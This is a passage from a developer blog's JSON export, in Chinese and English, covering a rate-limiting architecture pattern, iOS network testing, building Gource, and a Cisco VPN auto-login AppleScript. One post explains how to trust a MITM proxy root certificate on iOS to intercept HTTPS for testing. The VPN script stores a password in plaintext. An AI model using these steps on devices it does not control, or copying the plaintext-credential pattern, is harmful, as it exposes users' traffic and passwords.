个错误需要记录和处理，消耗内存和存储空间。 无法预测的完成时间：不知道节流限制，你无法估计处理需要多长时间。 解决方案 速率限制通过控制在一段时间内发送到服务的记录数量来减少流量并提升吞吐量。 服务基于不同指标进行节流： 操作数量（例如，每秒 20 个请求） 数据量（例如，每分钟 2 GiB） 操作的相对成本（例如，每秒 20,000 RUs） 你的速率限制实现必须控制发送到服务的操作，在不超过容量的情况下优化使用。 使用持久化消息系统 当你的 API 可以比受节流服务允许的速度更快地处理请求时，你需要管理导入速度。简单地缓冲请求是有风险的——如果你的应用程序崩溃，你会失去缓冲的数据。 相反，将记录发送到可以处理你完整导入速率的持久化消息系统。使用作业处理器以受节流服务限制内的受控速率读取记录。 持久化消息选项包括： 消息队列（例如，RabbitMQ、ActiveMQ） 事件流平台（例如，Apache Kafka） 云端队列服务 graph LR A[\"API(高速率)\"] --> B[\"持久化消息队列\"] B --> C[\"作业处理器 1\"] B --> D[\"作业处理器 2\"] B --> E[\"作业处理器 3\"] C --> F[\"受节流服务(有限速率)\"] D --> F E --> F style A fill:#e1f5ff style B fill:#fff4e1 style F fill:#ffe1e1 细粒度时间间隔 服务通常基于可理解的时间跨度（每秒或每分钟）进行节流，但计算机处理速度要快得多。与其每秒批量释放一次，不如更频繁地发送较小的数量以： 保持资源消耗（内存、CPU、网络）均匀流动 防止突发请求造成的瓶颈 例如，如果服务允许每秒 100 个操作，每 200 毫秒释放 20 个操作： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_6925d2c59')); var option = { \"title\": { \"text\": \"速率限制：平滑 vs 突发流量\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"突发 (100/秒)\", \"平滑 (20/200毫秒)\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"0毫秒\", \"200毫秒\", \"400毫秒\", \"600毫秒\", \"800毫秒\", \"1000毫秒\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"操作数\" }, \"series\": [ { \"name\": \"突发 (100/秒)\", \"type\": \"bar\", \"data\": [100, 0, 0, 0, 0, 100], \"itemStyle\": { \"color\": \"#ff6b6b\" } }, { \"name\": \"平滑 (20/200毫秒)\", \"type\": \"bar\", \"data\": [20, 20, 20, 20, 20, 20], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); 管理多个不协调的进程 当多个进程共享受节流服务时，逻辑分区服务的容量并使用分布式互斥系统来管理这些分区的锁定。 示例： 如果受节流系统允许每秒 500 个请求： 创建 20 个分区，每个价值每秒 25 个请求 需要 100 个请求的进程请求四个分区 系统授予两个分区 10 秒 进程速率限制为每秒 50 个请求，在 2 秒内完成，然后释放锁定 实现方法： 使用 blob 存储为每个逻辑分区创建一个小文件。应用程序在短时间内（例如，15 秒）获得这些文件的独占租约。对于授予的每个租约，应用程序可以使用该分区的容量。 block-beta columns 3 block:processes:3 columns 3 P1[\"进程 1\"] P2[\"进程 2\"] P3[\"进程 3\"] end space:3 block:leases:3 columns 3 L1[\"租约 125 请求/秒\"] L2[\"租约 225 请求/秒\"] L3[\"租约 325 请求/秒\"] end space:3 block:service:3 S[\"受节流服务总共 500 请求/秒\"] end P1 --> L1 P2 --> L2 P3 --> L3 L1 --> S L2 --> S L3 --> S style processes fill:#e1f5ff style leases fill:#fff4e1 style service fill:#ffe1e1 为了减少延迟，为每个进程分配少量独占容量。进程只在超过其保留容量时才寻求共享容量租约。 租约管理的替代技术包括 Zookeeper、Consul、etcd 和 Redis/Redsync。 问题与考量 💡 关键考量处理节流错误：速率限制减少错误但不会消除它们。你的应用程序仍必须处理任何发生的节流错误。 多个工作流：如果你的应用程序有多个工作流访问相同的受节流服务（例如，批量加载和查询），将所有工作流整合到你的速率限制策略中，或为每个工作流保留单独的容量池。 多应用程序使用：当多个应用程序使用相同的受节流服务时，增加的节流错误可能表示竞争。考虑暂时降低吞吐量，直到其他应用程序的使用量降低。 !!! 何时使用此模式 使用此模式以： 减少来自受节流限制服务的节流错误 与天真的错误重试方法相比减少流量 仅在有容量处理记录时才将记录出列，从而减少内存消耗 提高批处理完成时间的可预测性 示例架构 考虑一个应用程序，用户向 API 提交各种类型的记录。每种记录类型都有一个独特的作业处理器，执行验证、丰富化和数据库插入。 所有组件（API、作业处理器）都是独立扩展的独立进程，不直接通信。 graph TB U1[\"用户\"] --> API[\"API\"] U2[\"用户\"] --> API API --> QA[\"队列 A(类型 A 记录)\"] API --> QB[\"队列 B(类型 B 记录)\"] QA --> JPA[\"作业处理器 A\"] QB --> JPB[\"作业处理器 B\"] JPA --> LS[\"租约存储(Blob 0-9)\"] JPB --> LS JPA --> DB[\"数据库(1000 请求/秒限制)\"] JPB --> DB style API fill:#e1f5ff style QA fill:#fff4e1 style QB fill:#fff4e1 style LS fill:#f0e1ff style DB fill:#ffe1e1 工作流程： 用户向 API 提交 10,000 条类型 A 记录 API 将记录加入队列 A 用户向 API 提交 5,000 条类型 B 记录 API 将记录加入队列 B 作业处理器 A 尝试租用 blob 2 作业处理器 B 尝试租用 blob 2 作业处理器 A 失败；作业处理器 B 获得 15 秒的租约（100 请求/秒容量） 作业处理器 B 将 100 条记录出列并写入 1 秒后，两个处理器都尝试额外的租约 作业处理器 A 获得 blob 6（100 请求/秒）；作业处理器 B 获得 blob 3（现在总共 200 请求/秒） 处理器继续竞争租约并以其授予的速率处理记录 当租约到期时（15 秒后），处理器相应地降低其请求速率 相关模式 节流：速率限制通常是为了响应受节流服务而实现的。 重试：当请求导致节流错误时，在适当的间隔后重试。 基于队列的负载均衡：与速率限制类似但更广泛。主要差异： 速率限制不一定需要队列，但需要持久化消息 速率限制引入分布式互斥在分区上，允许管理与相同受节流服务通信的多个不协调进程的容量 基于队列的负载均衡适用于服务之间的任何性能不匹配；速率限制专门针对受节流服务 参考资料 Rate Limiting Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"速率限制模式：高效管理受限服務","slug":"2019/01/Rate-Limiting-Pattern-zh-TW","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/01/Rate-Limiting-Pattern/","permalink":"https://neo01.com/zh-TW/2019/01/Rate-Limiting-Pattern/","excerpt":"了解速率限制模式如何幫助你避免節流錯誤，並在使用有限制的服務時提升吞吐量。","text":"許多服務使用節流來控制資源消耗，對應用程式存取它們的速率施加限制。速率限制模式幫助你避免節流錯誤並準確預測吞吐量，特別是對於大規模重複性自動化任務（如批次處理）。 情境與問題 對受節流服務執行大量操作可能導致流量增加和效率降低。你需要追蹤被拒絕的請求並重試操作，可能需要多次傳遞才能完成工作。 考慮這個將資料匯入資料庫的範例： 你的應用程式需要匯入 10,000 筆記錄。每筆記錄需要 10 個請求單位（RUs），總共需要 100,000 RUs。 你的資料庫實例有 20,000 RUs 的佈建容量。 你傳送所有 10,000 筆記錄。2,000 筆成功，8,000 筆被拒絕。 你重試 8,000 筆記錄。2,000 筆成功，6,000 筆被拒絕。 你重試 6,000 筆記錄。2,000 筆成功，4,000 筆被拒絕。 你重試 4,000 筆記錄。2,000 筆成功，2,000 筆被拒絕。 你重試 2,000 筆記錄。全部成功。 工作完成了，但只是在傳送了 30,000 筆記錄之後——是實際資料集大小的三倍。 這種天真方法的額外問題： 錯誤處理開銷：20,000 個錯誤需要記錄和處理，消耗記憶體和儲存空間。 無法預測的完成時間：不知道節流限制，你無法估計處理需要多長時間。 解決方案 速率限制透過控制在一段時間內傳送到服務的記錄數量來減少流量並提升吞吐量。 服務基於不同指標進行節流： 操作數量（例如，每秒 20 個請求） 資料量（例如，每分鐘 2 GiB） 操作的相對成本（例如，每秒 20,000 RUs） 你的速率限制實作必須控制傳送到服務的操作，在不超過容量的情況下優化使用。 使用持久化訊息系統 當你的 API 可以比受節流服務允許的速度更快地處理請求時，你需要管理匯入速度。簡單地緩衝請求是有風險的——如果你的應用程式崩潰，你會失去緩衝的資料。 相反，將記錄傳送到可以處理你完整匯入速率的持久化訊息系統。使用作業處理器以受節流服務限制內的受控速率讀取記錄。 持久化訊息選項包括： 訊息佇列（例如，RabbitMQ、ActiveMQ） 事件串流平台（例如，Apache Kafka） 雲端佇列服務 graph LR A[\"API(高速率)\"] --> B[\"持久化訊息佇列\"] B --> C[\"作業處理器 1\"] B --> D[\"作業處理器 2\"] B --> E[\"作業處理器 3\"] C --> F[\"受節流服務(有限速率)\"] D --> F E --> F style A fill:#e1f5ff style B fill:#fff4e1 style F fill:#ffe1e1 細粒度時間間隔 服務通常基於可理解的時間跨度（每秒或每分鐘）進行節流，但電腦處理速度要快得多。與其每秒批次釋放一次，不如更頻繁地傳送較小的數量以： 保持資源消耗（記憶體、CPU、網路）均勻流動 防止突發請求造成的瓶頸 例如，如果服務允許每秒 100 個操作，每 200 毫秒釋放 20 個操作： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_dec7898f5')); var option = { \"title\": { \"text\": \"速率限制：平滑 vs 突發流量\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"突發 (100/秒)\", \"平滑 (20/200毫秒)\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"0毫秒\", \"200毫秒\", \"400毫秒\", \"600毫秒\", \"800毫秒\", \"1000毫秒\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"操作數\" }, \"series\": [ { \"name\": \"突發 (100/秒)\", \"type\": \"bar\", \"data\": [100, 0, 0, 0, 0, 100], \"itemStyle\": { \"color\": \"#ff6b6b\" } }, { \"name\": \"平滑 (20/200毫秒)\", \"type\": \"bar\", \"data\": [20, 20, 20, 20, 20, 20], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); 管理多個不協調的處理程序 當多個處理程序共享受節流服務時，邏輯分割服務的容量並使用分散式互斥系統來管理這些分割區的鎖定。 範例： 如果受節流系統允許每秒 500 個請求： 建立 20 個分割區，每個價值每秒 25 個請求 需要 100 個請求的處理程序請求四個分割區 系統授予兩個分割區 10 秒 處理程序速率限制為每秒 50 個請求，在 2 秒內完成，然後釋放鎖定 實作方法： 使用 blob 儲存為每個邏輯分割區建立一個小檔案。應用程式在短時間內（例如，15 秒）獲得這些檔案的獨佔租約。對於授予的每個租約，應用程式可以使用該分割區的容量。 block-beta columns 3 block:processes:3 columns 3 P1[\"處理程序 1\"] P2[\"處理程序 2\"] P3[\"處理程序 3\"] end space:3 block:leases:3 columns 3 L1[\"租約 125 請求/秒\"] L2[\"租約 225 請求/秒\"] L3[\"租約 325 請求/秒\"] end space:3 block:service:3 S[\"受節流服務總共 500 請求/秒\"] end P1 --> L1 P2 --> L2 P3 --> L3 L1 --> S L2 --> S L3 --> S style processes fill:#e1f5ff style leases fill:#fff4e1 style service fill:#ffe1e1 為了減少延遲，為每個處理程序分配少量獨佔容量。處理程序只在超過其保留容量時才尋求共享容量租約。 租約管理的替代技術包括 Zookeeper、Consul、etcd 和 Redis/Redsync。 問題與考量 💡 關鍵考量處理節流錯誤：速率限制減少錯誤但不會消除它們。你的應用程式仍必須處理任何發生的節流錯誤。 多個工作流：如果你的應用程式有多個工作流存取相同的受節流服務（例如，批次載入和查詢），將所有工作流整合到你的速率限制策略中，或為每個工作流保留單獨的容量池。 多應用程式使用：當多個應用程式使用相同的受節流服務時，增加的節流錯誤可能表示競爭。考慮暫時降低吞吐量，直到其他應用程式的使用量降低。 !!! 何時使用此模式 使用此模式以： 減少來自受節流限制服務的節流錯誤 與天真的錯誤重試方法相比減少流量 僅在有容量處理記錄時才將記錄出列，從而減少記憶體消耗 提高批次處理完成時間的可預測性 範例架構 考慮一個應用程式，使用者向 API 提交各種類型的記錄。每種記錄類型都有一個獨特的作業處理器，執行驗證、豐富化和資料庫插入。 所有元件（API、作業處理器）都是獨立擴展的獨立處理程序，不直接通訊。 graph TB U1[\"使用者\"] --> API[\"API\"] U2[\"使用者\"] --> API API --> QA[\"佇列 A(類型 A 記錄)\"] API --> QB[\"佇列 B(類型 B 記錄)\"] QA --> JPA[\"作業處理器 A\"] QB --> JPB[\"作業處理器 B\"] JPA --> LS[\"租約儲存(Blob 0-9)\"] JPB --> LS JPA --> DB[\"資料庫(1000 請求/秒限制)\"] JPB --> DB style API fill:#e1f5ff style QA fill:#fff4e1 style QB fill:#fff4e1 style LS fill:#f0e1ff style DB fill:#ffe1e1 工作流程： 使用者向 API 提交 10,000 筆類型 A 記錄 API 將記錄加入佇列 A 使用者向 API 提交 5,000 筆類型 B 記錄 API 將記錄加入佇列 B 作業處理器 A 嘗試租用 blob 2 作業處理器 B 嘗試租用 blob 2 作業處理器 A 失敗；作業處理器 B 獲得 15 秒的租約（100 請求/秒容量） 作業處理器 B 將 100 筆記錄出列並寫入 1 秒後，兩個處理器都嘗試額外的租約 作業處理器 A 獲得 blob 6（100 請求/秒）；作業處理器 B 獲得 blob 3（現在總共 200 請求/秒） 處理器繼續競爭租約並以其授予的速率處理記錄 當租約到期時（15 秒後），處理器相應地降低其請求速率 相關模式 節流：速率限制通常是為了回應受節流服務而實作的。 重試：當請求導致節流錯誤時，在適當的間隔後重試。 基於佇列的負載平衡：與速率限制類似但更廣泛。主要差異： 速率限制不一定需要佇列，但需要持久化訊息 速率限制引入分散式互斥在分割區上，允許管理與相同受節流服務通訊的多個不協調處理程序的容量 基於佇列的負載平衡適用於服務之間的任何效能不匹配；速率限制專門針對受節流服務 參考資料 Rate Limiting Pattern - Microsoft Learn","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"如何在 iOS 上为 MITM 代理设置根证书","slug":"2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS/","permalink":"https://neo01.com/zh-CN/2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS/","excerpt":"逐步图解如何在 iOS 设备上安装和信任 BrowserMob-Proxy 的根证书，轻松拦截 HTTPS 流量。","text":"在 iOS 上信任调试代理（如 BrowserMob-Proxy）的根证书在其前进方向上相当严格。您可以使用设备的 Safari 从 ca-certificate-rsa.cer 下载证书，或者您也可以将文件拖曳到模拟器中。 点击允许以安装证书 点击右上角的 Install 再次点击右上角的 Install Install 验证后，点击 Done。证书已安装 要将证书信任为根证书，请前往 General 中的 About 向下滚动直到看到 Certificate Trust Settings 切换 LittleProxy MITM 以信任它 点击 Continue 以将其信任为根证书 完成。现在所有流量都可以被代理拦截而不会有任何抱怨","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Test Automation","slug":"Test-Automation","permalink":"https://neo01.com/tags/Test-Automation/"}],"lang":"zh-CN"},{"title":"如何在 iOS 上為 MITM 代理設定根憑證","slug":"2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS/","permalink":"https://neo01.com/zh-TW/2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS/","excerpt":"逐步圖解如何在 iOS 裝置上安裝和信任 BrowserMob-Proxy 的根憑證，輕鬆放截 HTTPS 流量。","text":"在 iOS 上信任除錯代理（如 BrowserMob-Proxy）的根憑證在其前進方向上相當嚴格。您可以使用裝置的 Safari 從 ca-certificate-rsa.cer 下載憑證，或者您也可以將檔案拖曳到模擬器中。 點擊允許以安裝憑證 點擊右上角的 Install 再次點擊右上角的 Install Install 驗證後，點擊 Done。憑證已安裝 要將憑證信任為根憑證，請前往 General 中的 About 向下捲動直到看到 Certificate Trust Settings 切換 LittleProxy MITM 以信任它 點擊 Continue 以將其信任為根憑證 完成。現在所有流量都可以被代理攔截而不會有任何抱怨","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Test Automation","slug":"Test-Automation","permalink":"https://neo01.com/tags/Test-Automation/"}],"lang":"zh-TW"},{"title":"How To Setup Root Certificate For MITM Proxy On iOS","slug":"2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS","date":"un33fin33","updated":"un00fin00","comments":true,"path":"2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS/","permalink":"https://neo01.com/2018/03/How-To-Setup-Root-Certificate-For-MITM-Proxy-On-iOS/","excerpt":"Step-by-step visual guide to install and trust BrowserMob-Proxy root certificate on iOS devices. Intercept HTTPS traffic without complaints!","text":"Trusting the root certificate for debugging proxies such as BrowserMob-Proxy on iOS is quite strict in its forward direction. You can download the certificate from ca-certificate-rsa.cer using Device’s Safari, or you can drag the file into the Simulator as well. Tap on Allow to install the cert Tap Install on the upper right Again, tap Install on the upper right Install Once verified, tap on Done. The certificate is installed To trust the certificate as Root Certificate, goto About in General Scroll down until you see Certificate Trust Settings Toggle on the LittleProxy MITM to trust it Tap Continue to trust it as Root Certificate Done. Now all traffic can be intercepted by the proxy without any complaint","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"},{"name":"Test Automation","slug":"Test-Automation","permalink":"https://neo01.com/tags/Test-Automation/"}]},{"title":"在 iPhone 上對應用程式執行網路延遲測試的最簡單方法","slug":"2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone-zh-TW","date":"un44fin44","updated":"un00fin00","comments":true,"path":"/zh-TW/2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone/","permalink":"https://neo01.com/zh-TW/2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone/","excerpt":"無需代理或路由器！使用 iOS 內建的 Network Link Conditioner 輕鬆模擬網路延遲和不良網路條件。","text":"在 iOS 中模擬網路延遲甚至不良網路條件非常簡單。您不需要設定代理、路由器或不良的網路提供商。您所要做的就是使用 Xcode 啟用開發者模式。然後，您可以看到開發者圖示，它允許您輕鬆模擬各種網路場景。 在開發者下，您可以看到 Network Link Conditioner。預設情況下它是關閉的。點擊 Network Link Conditioner， 有幾個設定檔供您使用。您可以利用從您的手機到目標後端的 ping 時間（往返），然後減去從實驗室後端的 ping 時間。要建立新的設定檔，只需點擊 Add a profile… 假設 ping 時間為 900ms，您可以設定 Out Delay、In Delay 或兩者。 完成！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-TW"},{"title":"在 iPhone 上对应用程序执行网络延迟测试的最简单方法","slug":"2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone-zh-CN","date":"un44fin44","updated":"un00fin00","comments":true,"path":"/zh-CN/2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone/","permalink":"https://neo01.com/zh-CN/2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone/","excerpt":"无需代理或路由器！使用 iOS 内置的 Network Link Conditioner 轻松模拟网络延迟和不良网络条件。","text":"在 iOS 中模拟网络延迟甚至不良网络条件非常简单。您不需要设置代理、路由器或不良的网络提供商。您所要做的就是使用 Xcode 启用开发者模式。然后，您可以看到开发者图标，它允许您轻松模拟各种网络场景。 在开发者下，您可以看到 Network Link Conditioner。默认情况下它是关闭的。点击 Network Link Conditioner， 有几个配置文件供您使用。您可以利用从您的手机到目标后端的 ping 时间（往返），然后减去从实验室后端的 ping 时间。要创建新的配置文件，只需点击 Add a profile… 假设 ping 时间为 900ms，您可以设置 Out Delay、In Delay 或两者。 完成！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}],"lang":"zh-CN"},{"title":"The easiest way to perform network latency test on an App in iPhone","slug":"2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone","date":"un44fin44","updated":"un00fin00","comments":true,"path":"2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone/","permalink":"https://neo01.com/2018/01/The-easiest-way-to-perform-network-latency-test-on-an-App-in-iPhone/","excerpt":"No proxy or router needed! Simulate network latency and poor network conditions on iOS using the built-in Network Link Conditioner. Test your app's performance effortlessly.","text":"Simulating network latency or even poor network conditions in iOS is very easy. You don’t need to set up a proxy, router, or a poor network provider. All you have to do is enable Developer mode using Xcode. Then, you can see the Developer icon, which allows you to easily simulate various network scenarios. Under Developer, you can see the Network Link Conditioner. By default it is Off. Tap on the Network Link Conditioner, There are several profiles for you to use. You can utilize the ping time (round-trip) from your mobile phone to your target backend, and then subtract the ping time from your lab’s backend. To create a new profile, simply tap on Add a profile… Let’s say the ping time is 900ms, you can set either Out Delay, In Delay or both. Done!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"https://neo01.com/tags/iOS/"}]},{"title":"Mac 上的 Gsource","slug":"2017/12/Gsource-on-Mac-zh-CN","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-CN/2017/12/Gsource-on-Mac/","permalink":"https://neo01.com/zh-CN/2017/12/Gsource-on-Mac/","excerpt":"用炫酷的 3D 动画展示你的代码历史！在 Mac 上安装 Gource，让非技术人员看到开发者的努力。","text":"向非 IT 人员说明开发者工作有多努力通常很困难。通常，我会尝试让他们观看 Gource。 在 Mac 上设置 Gource 并不困难，但有几个步骤。首先，您必须安装 Brew。然后，从终端运行以下命令， # 如果您没有 wget，请安装它 brew install wget # gsource 依赖项 brew install glew brew install pkg-config brew install sdl2 brew install sdl2_image brew install boost brew install glm brew install pcre # 下载并构建 Gource wget https:&#x2F;&#x2F;github.com&#x2F;acaudwell&#x2F;Gource&#x2F;releases&#x2F;download&#x2F;gource-0.47&#x2F;gource-0.47.tar.gz tar vfxz gource-0.47.tar.gz cd gource-0.47 .&#x2F;configure # 假设 configure 没有错误 make install 二进制文件将安装到 /usr/local/bin/gource。运行以下命令从具有 Git 存储库的目录生成视频 cd [your git repository] &#x2F;usr&#x2F;local&#x2F;bin&#x2F;gource 您可以通过将您的头像重命名为 Git 作者名称（如 Git 日志中的&quot;Your Name.png&quot;）来替换默认图标，将其放在本地目录中，并运行以下 Gource 命令 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;gource --user-image-dir . 如果您觉得视频太长，可以通过使用 -c、--time-scale 或 SCALE 更改模拟时间比例（默认值：1.0）来调整速度。 您可以通过使用 --max-files NUMBER 将最大文件数从无限制减少到一个值（如 100）来使您的视频不那么混乱 当添加或删除大量文件时，使用 -e 0.5 添加弹性很有趣。 更多信息可以在 Controls 中找到 视频可以使用选项 -o FILENAME 输出到文件。1 分钟视频的文件大小可能超过 10GB，所以请注意。 生成视频后，您可以使用 libav 将其转换为 MP4， brew install libav avconv -vcodec ppm -f image2pipe -i gource.ppm -c:v libx265 -c:a copy gource.mkv 我的博客的 Gource：","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"},{"name":"Visualization","slug":"Visualization","permalink":"https://neo01.com/tags/Visualization/"}],"lang":"zh-CN"},{"title":"Mac 上的 Gsource","slug":"2017/12/Gsource-on-Mac-zh-TW","date":"un55fin55","updated":"un00fin00","comments":true,"path":"/zh-TW/2017/12/Gsource-on-Mac/","permalink":"https://neo01.com/zh-TW/2017/12/Gsource-on-Mac/","excerpt":"用炅酷的 3D 動畫展示你的程式碼歷史！在 Mac 上安裝 Gource，讓非技術人員看到開發者的努力。","text":"向非 IT 人員說明開發者工作有多努力通常很困難。通常，我會嘗試讓他們觀看 Gource。 在 Mac 上設定 Gource 並不困難，但有幾個步驟。首先，您必須安裝 Brew。然後，從終端機執行以下命令， # 如果您沒有 wget，請安裝它 brew install wget # gsource 相依性 brew install glew brew install pkg-config brew install sdl2 brew install sdl2_image brew install boost brew install glm brew install pcre # 下載並建置 Gource wget https:&#x2F;&#x2F;github.com&#x2F;acaudwell&#x2F;Gource&#x2F;releases&#x2F;download&#x2F;gource-0.47&#x2F;gource-0.47.tar.gz tar vfxz gource-0.47.tar.gz cd gource-0.47 .&#x2F;configure # 假設 configure 沒有錯誤 make install 二進位檔案將安裝到 /usr/local/bin/gource。執行以下命令從具有 Git 儲存庫的目錄生成影片 cd [your git repository] &#x2F;usr&#x2F;local&#x2F;bin&#x2F;gource 您可以透過將您的頭像重新命名為 Git 作者名稱（如 Git 日誌中的「Your Name.png」）來替換預設圖示，將其放在本機目錄中，並執行以下 Gource 命令 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;gource --user-image-dir . 如果您覺得影片太長，可以透過使用 -c、--time-scale 或 SCALE 更改模擬時間比例（預設值：1.0）來調整速度。 您可以透過使用 --max-files NUMBER 將最大檔案數從無限制減少到一個值（如 100）來使您的影片不那麼混亂 當新增或刪除大量檔案時，使用 -e 0.5 新增彈性很有趣。 更多資訊可以在 Controls 中找到 影片可以使用選項 -o FILENAME 輸出到檔案。1 分鐘影片的檔案大小可能超過 10GB，所以請注意。 生成影片後，您可以使用 libav 將其轉換為 MP4， brew install libav avconv -vcodec ppm -f image2pipe -i gource.ppm -c:v libx265 -c:a copy gource.mkv 我的部落格的 Gource：","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"},{"name":"Visualization","slug":"Visualization","permalink":"https://neo01.com/tags/Visualization/"}],"lang":"zh-TW"},{"title":"Gsource on Mac","slug":"2017/12/Gsource-on-Mac","date":"un55fin55","updated":"un66fin66","comments":true,"path":"2017/12/Gsource-on-Mac/","permalink":"https://neo01.com/2017/12/Gsource-on-Mac/","excerpt":"Visualize your Git repository history with stunning 3D animations using Gource on Mac. Show non-technical folks how hard developers work with mesmerizing code evolution videos.","text":"It is often difficult to tell how hard developers are working to non-IT folks. Usually, I try to let them watch Gource. Setting up Gource on Mac is not difficult, but it has several steps. First, you have to have Brew installed. Then, run the commands below from Terminal, # install wget if you don&#39;t have brew install wget # gsource dependency brew install glew brew install pkg-config brew install sdl2 brew install sdl2_image brew install boost brew install glm brew install pcre # download and build Gource wget https:&#x2F;&#x2F;github.com&#x2F;acaudwell&#x2F;Gource&#x2F;releases&#x2F;download&#x2F;gource-0.47&#x2F;gource-0.47.tar.gz tar vfxz gource-0.47.tar.gz cd gource-0.47 .&#x2F;configure # assume no error from configure make install The binary will install into /usr/local/bin/gource. Run the command below to generate the video from a directory with a Git repository cd [your git repository] &#x2F;usr&#x2F;local&#x2F;bin&#x2F;gource You can replace the default icon with yours by renaming your avatar to the Git author name such as “Your Name.png” as in the Git log, place it in the local directory, and run the Gource command below &#x2F;usr&#x2F;local&#x2F;bin&#x2F;gource --user-image-dir . If you feel the video is too long, you can adjust the speed by changing the simulation time scale (default: 1.0) with -c, --time-scale, or SCALE. You can make your video less messy by reducing the maximum number of files from unlimited to a value such as 100 with --max-files NUMBER Adding elasticity is fun with -e 0.5 when a large number of files are being added or deleted. More information can be found in Controls The video can be output to a file with the option -o FILENAME. The file size can be over 10GB for a 1-minute video, so beware. After the video is generated, you can use libav to convert it to MP4, brew install libav avconv -vcodec ppm -f image2pipe -i gource.ppm -c:v libx265 -c:a copy gource.mkv Gource of my blog:","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"https://neo01.com/tags/Mac/"},{"name":"Visualization","slug":"Visualization","permalink":"https://neo01.com/tags/Visualization/"}]},{"title":"如何在 macOS High Sierra 上自动登录 Cisco VPN","slug":"2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra/","permalink":"https://neo01.com/zh-CN/2017/12/How-to-login-Cisco-VPN-automatically-on-macOS-High-Sierra/","excerpt":"厨烦每次输入 VPN 密码？使用 AppleScript 和 Automator 自动化 Cisco VPN 登录，一键连接！","text":"在 Macintosh 操作系统（macOS）上登录 Cisco IPSec VPN 时，无法保存密码。 对我来说最好的解决方案是在 Automator 中编写 AppleScript，或从命令行运行它，以自动化登录过程。 Automator 中的 AppleScript 打开 Apple 的 Automator， 选择 New Document 选择 Service 创建的服务默认为 receives selected text。这意味着您需要选择文本或在文本编辑器中有焦点才能启用该服务。 尝试搜索动作 Run AppleScript。然后，将动作拖曳到右侧。 将以下代码粘贴到编辑器中， on run &#123;input, parameters&#125; set vpn_name to &quot;&#39;your VPN name&#39;&quot; set user_name to &quot;your username&quot; set passwd to &quot;your password&quot; tell application &quot;System Events&quot; set rc to do shell script &quot;scutil --nc status &quot; &amp; vpn_name if rc starts with &quot;Disconnected&quot; then do shell script &quot;scutil --nc start &quot; &amp; vpn_name &amp; &quot; --user &quot; &amp; user_name delay 3 keystroke passwd keystroke return end if end tell return input end run 更新脚本中的 vpn_name、username 和 passwd。 您可以参考下面的屏幕截图来获取 vpn_name，即 VPN (Cisco IPSec)。脚本使用 scutil --nc status 检查 VPN 连接状态，并使用 scutil --nc start 启动 VPN 连接。通常，VPN 登录对话框会在 3 